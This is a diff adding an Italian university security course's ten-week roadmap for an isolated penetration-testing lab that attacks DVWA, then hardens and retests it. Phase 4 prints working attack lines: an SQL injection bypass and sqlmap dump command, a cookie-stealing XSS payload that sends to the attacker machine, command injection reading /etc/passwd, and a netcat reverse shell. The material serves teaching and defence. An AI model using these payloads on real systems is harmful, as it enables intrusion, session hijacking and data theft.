@@ -1,0 +1,168 @@
+ROADMAP DETTAGLIATA: PROGETTO DI SICUREZZA INFORMATICA (LAUREA MAGISTRALE)
+Prof. Alessandro Aldini - Universita degli Studi di Urbino Carlo Bo
+Tipologia Progetto: Laboratorio Virtuale di Penetration Testing e Valutazione della Security Posture
+-------------------------------------------------------------------------------------------------
+
+Questa roadmap descrive passo dopo passo tutte le attivita necessarie per configurare l'ambiente,
+eseguire i test di penetrazione, applicare le contromisure di sicurezza (remediation), analizzare i log
+e produrre la relazione finale entro i tempi stimati (circa 2 mesi / 8-10 settimane).
+
+================================================================================
+FASE 1: PIANIFICAZIONE, REQUISITI E DESIGN DELL'ARCHITETTURA (Settimana 1)
+================================================================================
+
+Obiettivo: Definire lo scenario di attacco/difesa e l'architettura di rete isolata.
+
+1.1 Scelta dello Scenario Applicativo:
+   - Identificare la tipologia di server vittima (es. Server Web Apache/PHP con MySQL).
+   - Scegliere la web application deliberatamente vulnerabile da ospitare (consigliata: DVWA - Damn Vulnerable Web Application, o OWASP Mutillidae II).
+
+1.2 Definizione del Modello di Rete (Topologia):
+   - Progettare una rete isolata per evitare impatti su sistemi reali (allineato alle direttive del corso).
+   - Configurazione di rete in VirtualBox: Rete Interna (Internal Network), nome della rete es. LabSicurezza.
+   - Definizione del piano di indirizzamento IP statico:
+     * Rete: 192.168.100.0/24
+     * Attore 1 (Attaccante - Kali Linux): IP 192.168.100.10
+     * Attore 2 (Server Vittima - Ubuntu Server/Metasploitable): IP 192.168.100.20
+
+1.3 Output da documentare per la relazione:
+   - Schema grafico della topologia di rete (Attaccante -> Switch Virtuale -> Vittima).
+   - Razionale della scelta dello scenario e degli indirizzi IP.
+
+================================================================================
+FASE 2: SETUP DELL'AMBIENTE VIRTUALE E HARDENING INIZIALE (Settimana 2)
+================================================================================
+
+Obiettivo: Installare e configurare correttamente le macchine virtuali garantendo l'isolamento.
+
+2.1 Configurazione della Macchina Attaccante:
+   - Scaricare e importare la VM Kali Linux su VirtualBox.
+   - Configurare la scheda di rete su Rete Interna (LabSicurezza).
+   - Assegnare l'IP statico (192.168.100.10) modificando il file /etc/network/interfaces o tramite NetworkManager.
+
+2.2 Configurazione della Macchina Server Vittima:
+   - Scaricare e installare Ubuntu Server (o utilizzare la distribuzione Metasploitable2, che ha gia servizi pronti).
+   - Configurare la scheda di rete su Rete Interna (LabSicurezza).
+   - Assegnare l'IP statico (192.168.100.20).
+   - Installare lo stack LAMP (Apache, MySQL, PHP) se si usa Ubuntu pulito, oppure avviare i servizi esistenti.
+   - Scaricare il sorgente di DVWA/Mutillidae, posizionarlo nella root di Apache (/var/www/html/), configurare il database MySQL dedicato e verificare l'accessibilita locale.
+
+2.3 Test di Connettivita (Isolamento ed Reachability):
+   - Eseguire un ping da Kali a Ubuntu (deve rispondere).
+   - Eseguire un ping verso l'esterno (es. 8.8.8.8) da entrambe le macchine (NON deve rispondere, a garanzia dell'isolamento in Rete Interna).
+   - Accedere via browser da Kali Linux all'indirizzo http://192.168.100.20/dvwa per verificare il corretto funzionamento.
+
+================================================================================
+FASE 3: INFORMATION GATHERING & VULNERABILITY ASSESSMENT (Settimane 3-4)
+================================================================================
+
+Obiettivo: Simulare le prime fasi della Cyber Kill Chain (Reconnaissance e Scanning).
+
+3.1 Scansione di Rete e OS Detection (Nmap):
+   - Eseguire un ping scan iniziale per confermare l'host attivo.
+   - Eseguire una scansione approfondita delle porte (TCP/UDP) per identificare i servizi attivi sul server.
+   - Comandi Nmap da testare e documentare:
+     * nmap -sP 192.168.100.0/24 (Network Discovery)
+     * nmap -sV -sC -O -p- 192.168.100.20 (Scansione completa di porte, versioni dei servizi e sistema operativo).
+   - Analizzare i risultati: identificare la versione di Apache, PHP e MySQL.
+
+3.2 Web Enumeration & Directory Busting:
+   - Utilizzare strumenti di enumeration dei percorsi web per mappare le pagine nascoste o i file di configurazione esposti.
+   - Strumenti da usare: dirb, gobuster o dirsearch.
+   - Esempio: dirb http://192.168.100.20/dvwa/
+
+3.3 Vulnerability Scanning (OWASP ZAP):
+   - Avviare OWASP ZAP su Kali Linux.
+   - Configurare ZAP come proxy o eseguire una scansione automatizzata (Spider + Active Scan) dell'applicazione target.
+   - Esportare il report preliminare delle vulnerabilita rilevate (es. SQL Injection potenziali, XSS, configurazioni errate dei cookie di sessione).
+
+================================================================================
+FASE 4: EXPLOITATION - ATTACCHI MIRATI (Settimane 5-6)
+================================================================================
+
+Obiettivo: Sferrare gli attacchi selezionati basandosi sulle vulnerabilita scoperte, completando la Kill Chain.
+
+4.1 Attacco 1: SQL Injection (SQLi) - Autenticazione e Data Extraction
+   - Target: Pagina di Login o form di ricerca dell'applicazione web.
+   - Bypass di Autenticazione: Testare la classica stringa ' OR '1'='1 nel campo username per accedere senza credenziali.
+   - Data Extraction (Union-based o Error-based): Sviluppare manualmente o tramite l'uso di sqlmap l'estrazione dei dati del database.
+   - Comando sqlmap indicativo: sqlmap -u "http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=..." --dbs
+   - Documentare l'estrazione degli hash delle password degli utenti del server.
+
+4.2 Attacco 2: Stored/Reflected Cross-Site Scripting (XSS) - Session Hijacking
+   - Target: Sezione commenti (Stored) o form di input riflesso.
+   - Iniettare un payload JavaScript per catturare il cookie di sessione.
+   - Esempio di payload: <script>new Image().src="http://192.168.100.10/log.php?cookie="+document.cookie;</script>
+   - Configurare un listener Netcat o un server web su Kali per intercettare il cookie rubato.
+   - Dimostrare il bypass dell'autenticazione su un altro browser inserendo manualmente il cookie rubato.
+
+4.3 Attacco 3: Command Injection / Remote Code Execution (RCE)
+   - Target: Funzionalita del server che esegue comandi di sistema (es. form che esegue il ping di un IP).
+   - Sfruttare l'assenza di sanificazione inserendo operatori di concatenazione (es. 127.0.0.1 ; cat /etc/passwd oppure 127.0.0.1 && uname -a).
+   - Sferrare una Reverse Shell: Iniettare un comando netcat o bash per connettersi a Kali Linux (es. nc -e /bin/sh 192.168.100.10 4444).
+   - Ottenere l'accesso alla shell interattiva sul server vittima.
+
+================================================================================
+FASE 5: POST-EXPLOITATION E LOG ANALYSIS (Settimana 7)
+================================================================================
+
+Obiettivo: Analizzare l'impatto sul server e studiare le tracce lasciate dagli attacchi.
+
+5.1 Raccolta ed Esame dei Log di Apache:
+   - Accedere al server vittima e localizzare i log in /var/log/apache2/access.log e /var/log/apache2/error.log.
+   - Isolare le righe corrispondenti agli attacchi effettuati da Kali (filtrando per l'IP 192.168.100.10).
+   - Identificare come appaiono le stringhe di SQLi e Command Injection all'interno delle richieste HTTP GET/POST (es. i caratteri speciali codificati in esadecimale come %27 per l'apice singolo).
+
+5.2 Raccolta dei Log del Database (MySQL/MariaDB):
+   - Abilitare il general log su MySQL se necessario.
+   - Analizzare come le query maliziose iniettate tramite SQLi modificano la struttura logica della query originale registrata dal DBMS.
+
+================================================================================
+FASE 6: REMEDIATION & DEFENSE STRATEGIES (Settimana 8)
+================================================================================
+
+Obiettivo: Applicare le contromisure sul server vittima per mitigare le vulnerabilita (La componente di Valutazione).
+
+6.1 Correzione del Codice Sorgente (Secure Coding):
+   - Mitigazione SQLi: Sostituire le query vulnerabili nel codice PHP implementando le Prepared Statements tramite PDO o MySQLi, separando i dati dalla logica della query.
+   - Mitigazione XSS: Implementare l'input validation e l'output validation/sanitization utilizzando funzioni native come htmlspecialchars() o strip_tags() in PHP prima di stampare a video i dati inseriti dall'utente.
+   - Mitigazione Command Injection: Rimuovere l'uso di funzioni pericolose come shell_exec() o exec(), oppure forzare una whitelist rigorosa degli input (es. permettere solo indirizzi IP validi tramite espressioni regolari).
+
+6.2 Difesa a Livello Network/Sistemistico:
+   - Configurare il firewall locale del server (es. regole iptables o ufw) per limitare il traffico o bloccare tentativi di scansione aggressivi.
+   - Ridurre la superficie d'attacco disabilitando i servizi non necessari emersi dalla scansione Nmap iniziale.
+
+================================================================================
+FASE 7: RE-EVALUATION & ANALISI COMPARATIVA (Settimana 9)
+================================================================================
+
+Obiettivo: Valutare l'efficacia delle difese ripetendo i test (Validation).
+
+7.1 Esecuzione del Secondo Giro di Test:
+   - Ripetere esattamente gli stessi attacchi della Fase 4 dalla macchina Kali Linux.
+   - Verificare l'esito dell'attacco (l'attacco deve fallire: es. la SQL Injection restituisce un errore di autenticazione o viene bloccata, il payload XSS viene stampato come testo semplice e non eseguito, la command injection non esegue comandi arbitrari).
+
+7.2 Analisi dei Nuovi Log:
+   - Verificare come i log registrano i tentativi di attacco falliti (es. risposte HTTP con codice di stato 403 Forbidden o 400 Bad Request anziche 200 OK).
+   - Redigere una tabella comparativa prima/dopo per dimostrare l'effettivo innalzamento della sicurezza del sistema (Security Posture).
+
+================================================================================
+FASE 8: SCRITTURA DELLA RELAZIONE E PREPARAZIONE ESAME (Settimana 10)
+================================================================================
+
+Obiettivo: Strutturare il documento finale per la consegna al Prof. Aldini.
+
+8.1 Struttura Standard Richiesta per la Relazione:
+   - INTRODUZIONE: Obiettivi del progetto, scenario scelto e framework concettuale (Cyber Kill Chain).
+   - TOPOLOGIA DI RETE: Dettaglio della configurazione di rete isolata su VirtualBox (interfacce, IP statici, motivazione dell'isolamento).
+   - VULNERABILITY ASSESSMENT: Risultati della scansione Nmap e OWASP ZAP, con analisi dei servizi e delle porte aperte scoperti.
+   - FASE DI EXPLOITATION: Descrizione dettagliata di ciascun attacco sferrato (SQLi, XSS, Command Injection). Includere screenshot dei payload usati, dei risultati intermedi (es. hash estratti) e del successo dell'attacco (es. shell remota ottenuta).
+   - VALUTAZIONE DEI LOG (ANTE-REMEDIATION): Estratti dei file di log del server che evidenziano l'impronta digitale dell'attaccante.
+   - DIFESE APPLICATE (REMEDIATION): Descrizione delle modifiche apportate al codice sorgente e delle configurazioni sistemistiche introdotte per sanare i problemi. Mostrare snippet di codice prima e dopo la cura.
+   - RE-EVALUATION E ANALISI COMPARATIVA: Risultati dei test post-difesa, confronto dei log e considerazioni su come la postura di sicurezza sia cambiata.
+   - CONCLUSIONI: Considerazioni finali sul lavoro svolto e lezioni apprese.
+
+8.2 Revisione Finale:
+   - Verificare che non vi siano riferimenti a reti esterne o reali.
+   - Controllare la chiarezza espositiva e la formattazione dei blocchi di codice/comandi.
+   - Consegnare il file al professore secondo le modalita Blend/Email previste per l'appello d'esame scelto.
